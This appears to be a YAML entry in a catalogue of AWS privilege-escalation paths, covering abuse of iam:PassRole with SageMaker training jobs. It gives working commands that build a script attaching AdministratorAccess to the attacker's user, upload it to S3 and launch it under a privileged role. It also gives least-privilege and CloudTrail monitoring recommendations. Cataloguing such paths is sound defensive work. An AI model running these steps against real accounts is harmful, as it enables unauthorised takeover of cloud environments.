id: sagemaker-002
name: iam:PassRole + sagemaker:CreateTrainingJob
category: new-passrole
services:
- iam
- sagemaker
description: A principal with `iam:PassRole` and `sagemaker:CreateTrainingJob` can create a SageMaker training job with a privileged execution role. Training jobs can execute arbitrary container code and access AWS APIs with the permissions of the attached IAM role. By creating a training job with a malicious training script or container, the attacker can execute code with elevated privileges and exfiltrate credentials or modify AWS resources.
prerequisites:
  admin:
  - A role must exist that trusts sagemaker.amazonaws.com to assume it
  - The role must have administrative permissions (e.g., AdministratorAccess)
  - An S3 bucket must be accessible to store training data and output
  lateral:
  - A role must exist that trusts sagemaker.amazonaws.com to assume it
  - An S3 bucket must be accessible to store training data and output
exploitationSteps:
  awscli:
  - step: 1
    command: |
      echo '#!/usr/bin/env python3
      import boto3
      iam = boto3.client("iam")
      iam.attach_user_policy(
          UserName="YOUR_USERNAME",
          PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
      )
      ' > exploit.py
    description: Create a malicious training script that attaches AdministratorAccess policy to your user
  - step: 2
    command: '# Package the script as required by SageMaker

      tar -czf sourcedir.tar.gz exploit.py

      aws s3 cp sourcedir.tar.gz s3://BUCKET_NAME/sourcedir.tar.gz

      '
    description: Package and upload the malicious script to S3 (SageMaker requires tar.gz format)
  - step: 3
    command: |
      aws sagemaker create-training-job \
        --training-job-name privesc-training \
        --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
        --algorithm-specification '{"TrainingImage":"763104351884.dkr.ecr.REGION.amazonaws.com/pytorch-training:2.0.0-cpu-py310","TrainingInputMode":"File"}' \
        --input-data-config '[{"ChannelName":"training","DataSource":{"S3DataSource":{"S3DataType":"S3Prefix","S3Uri":"s3://BUCKET_NAME","S3DataDistributionType":"FullyReplicated"}}}]' \
        --output-data-config '{"S3OutputPath":"s3://BUCKET_NAME/output"}' \
        --resource-config '{"InstanceType":"ml.m5.large","InstanceCount":1,"VolumeSizeInGB":10}' \
        --stopping-condition '{"MaxRuntimeInSeconds":600}' \
        --hyper-parameters '{"sagemaker_program":"exploit.py","sagemaker_submit_directory":"s3://BUCKET_NAME/sourcedir.tar.gz"}'
    description: Create a training job with the privileged role that executes the malicious script via hyperparameters
  - step: 4
    command: aws sagemaker describe-training-job --training-job-name privesc-training
    description: Monitor the training job status and wait for execution
recommendation: |
  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.

  - **Avoid administrative service roles** - Very rarely does a SageMaker training job need administrative access. Use the principle of least privilege.
  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.

  Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificSageMakerRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "sagemaker.amazonaws.com"
      }
    }
  }
  ```

  - Monitor CloudTrail for unusual SageMaker training job creation followed by immediate execution
  - Monitor CloudTrail for training job creation by principals who do not usually create training jobs
  - Monitor CloudTrail for roles being passed to SageMaker that haven't been used before
  - Monitor and alert on SageMaker training job creation with privileged roles
  - Regularly audit SageMaker training jobs for excessive IAM permissions
  - Regularly audit all IAM roles that trust the SageMaker service and down-scope any roles with administrative access
limitations: 'This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or access to sensitive data.

  '
